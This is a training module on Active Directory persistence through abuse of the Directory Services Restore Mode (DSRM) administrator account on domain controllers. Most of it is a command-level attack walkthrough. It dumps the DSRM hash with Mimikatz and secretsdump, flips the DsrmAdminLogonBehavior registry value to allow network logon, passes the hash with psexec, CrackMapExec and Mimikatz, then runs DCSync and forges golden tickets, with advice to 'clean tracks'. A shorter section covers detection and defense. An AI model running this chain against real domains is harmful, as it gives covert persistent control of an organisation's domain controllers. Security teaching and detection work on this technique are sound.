# DSRM Abuse

## Unit 7 - Topic 6 | Persistence

---

## Overview

**Directory Services Restore Mode (DSRM)** is a boot mode for Domain Controllers used for AD recovery. Each DC has a local DSRM administrator account with a separate password set during DC promotion. Attackers can abuse this account for persistent backdoor access to Domain Controllers.

---

## 1. Understanding DSRM

```
DSRM ACCOUNT:

WHAT IS IT:
├── Local administrator account on every DC
├── Password set during dcpromo (AD DS installation)
├── Separate from domain Administrator account
├── Works even when AD is offline
├── Originally for: disaster recovery of AD database
└── RID: 500 (same as local Administrator)

WHY IT'S USEFUL FOR ATTACKERS:
├── Rarely monitored (most admins forget about it)
├── Password rarely changed (often never!)
├── Not a domain account → not in AD audit logs
├── Can be used for remote logon (with registry tweak)
├── Survives domain password changes
└── Independent of AD entirely

DEFAULT BEHAVIOR:
├── Can only be used in DSRM boot mode (offline)
├── BUT: Registry setting can enable network logon!
└── DsrmAdminLogonBehavior controls this

REGISTRY KEY:
HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior
├── 0 (default): DSRM account only in DSRM boot mode
├── 1: DSRM account can log on when AD service is stopped
└── 2: DSRM account can ALWAYS log on (even normally!)
    → THIS IS WHAT ATTACKERS SET!
```

---

## 2. DSRM Attack Execution

```bash
# === STEP 1: EXTRACT DSRM PASSWORD HASH ===
# Must have SYSTEM/DA access on the DC

# Mimikatz (on DC):
privilege::debug
token::elevate
lsadump::sam
# Output includes local Administrator hash
# This IS the DSRM administrator hash!

# Alternative:
mimikatz# lsadump::lsa /patch
# Look for local Administrator (RID 500)

# Impacket (remote):
secretsdump.py corp.local/admin:pass@dc01
# Look for: Administrator:500:LM:NTLM:::
# The local Administrator = DSRM account

# === STEP 2: MODIFY REGISTRY FOR REMOTE LOGON ===
# Default: DSRM can only be used in safe mode
# Change to: Allow network logon anytime

# On the DC:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" \
  /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

# Remotely via PowerShell:
Invoke-Command -ComputerName dc01 -Credential corp\admin \
  -ScriptBlock {
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" \
      -Name "DsrmAdminLogonBehavior" -Value 2
  }

# Remotely via reg.exe:
reg add "\\dc01\HKLM\System\CurrentControlSet\Control\Lsa" \
  /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

# === STEP 3: USE DSRM HASH FOR ACCESS ===
# Pass-the-Hash with DSRM hash:
# Must specify DC's hostname (not domain) as the domain:
psexec.py dc01/Administrator@dc01 -hashes :DSRM_HASH
# Note: dc01/Administrator (local), not corp/Administrator (domain)

# Mimikatz PtH:
sekurlsa::pth /user:Administrator /domain:dc01 \
  /ntlm:DSRM_HASH /run:cmd.exe
# /domain:dc01 → uses LOCAL account, not domain account

# CrackMapExec:
crackmapexec smb dc01 -u Administrator -H DSRM_HASH \
  --local-auth
# --local-auth: Use local account, not domain
```

---

## 3. DSRM Persistence Workflow

```
COMPLETE DSRM PERSISTENCE CHAIN:

PHASE 1 — SETUP (Requires DA access):
1. Access DC as Domain Admin
2. Extract DSRM hash: lsadump::sam
3. Set DsrmAdminLogonBehavior = 2
4. Store DSRM hash securely offline
5. Clean tracks, remove other backdoors

PHASE 2 — RE-ACCESS (After losing DA):
1. Use DSRM hash for PtH to DC
   psexec.py dc01/Administrator@dc01 -hashes :DSRM_HASH
2. You're now SYSTEM on the DC!
3. DCSync all hashes:
   secretsdump.py dc01/Administrator@dc01 -hashes :DSRM_HASH
4. Create Golden Ticket with krbtgt hash
5. Full domain access restored!

ADVANTAGES:
├── Survives ALL domain password changes
├── Survives krbtgt password resets
├── Independent of AD (works even if AD is broken)
├── Rarely monitored
├── Simple to deploy
└── Difficult to detect (looks like local admin logon)
```

---

## 4. Changing DSRM Password

```powershell
# === ATTACKERS: SET KNOWN DSRM PASSWORD ===
# If current DSRM password is unknown:
# (Requires interactive or service access on DC)

# ntdsutil (interactive):
ntdsutil
: set dsrm password
: reset password on server null
: <new_password>
: q
: q

# PowerShell:
ntdsutil "set dsrm password" "reset password on server null" q q

# === SYNC DSRM WITH DOMAIN ACCOUNT ===
# Sync DSRM password with a domain user's password:
ntdsutil "set dsrm password" \
  "sync from domain account svc_backup" q q
# Now DSRM password = svc_backup's password
# Change svc_backup's password → DSRM doesn't follow!
# DSRM retains the password at time of sync
```

---

## 5. Detection and Defense

```
DETECTION METHODS:

REGISTRY MONITORING:
├── Monitor DsrmAdminLogonBehavior changes
│   Key: HKLM\System\CurrentControlSet\Control\Lsa
│   Alert if value changes to 1 or 2!
├── Sysmon Event ID 13: Registry value set
└── Security Event ID 4657: Registry value modified

LOGON MONITORING:
├── Event ID 4624: Logon with local account on DC
│   Look for: Logon Type 3 + local account name
│   Should NOT happen in normal operations!
├── Account Domain = DC hostname (not domain name)
│   → Indicates local account usage
└── Source IP from non-DC system

DSRM PASSWORD:
├── Regularly change DSRM password
├── Audit DSRM password age
├── Don't sync with domain accounts
└── Store DSRM password securely

DEFENSE:
├── Keep DsrmAdminLogonBehavior = 0 (default)
├── Monitor for registry changes to this key
├── Alert on local account logon to DCs
├── Regular DSRM password rotation
├── Consider DSRM in incident response procedures
└── Restrict physical/console access to DCs
```

| Defense | Implementation |
|---------|---------------|
| **Registry monitoring** | Alert on DsrmAdminLogonBehavior changes |
| **Logon monitoring** | Detect local account network logon to DCs |
| **Password rotation** | Change DSRM password regularly |
| **Keep default** | DsrmAdminLogonBehavior = 0 |
| **Incident response** | Include DSRM check in DC investigation |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **DSRM** | Local admin account on every DC |
| **Key registry** | DsrmAdminLogonBehavior = 2 enables remote logon |
| **Hash extraction** | lsadump::sam on DC |
| **PtH usage** | Use local domain (dc01, not corp.local) |
| **Persistence** | Survives ALL domain password changes |
| **Detection** | Registry monitoring + local logon on DCs |

---

## Quick Revision Questions

1. **What is the DSRM administrator account?**
2. **What registry value enables DSRM remote logon?**
3. **How do you specify local vs. domain admin during PtH?**
4. **Why does DSRM persistence survive domain password resets?**
5. **How do you detect DSRM abuse?**

---

[← Previous: Group Policy Persistence](05-group-policy-persistence.md)

---

*Unit 7 - Topic 6 of 6 | [Back to README](../README.md) | [Next Unit: Domain Dominance →](../08-Domain-Dominance/01-domain-admin-escalation.md)*
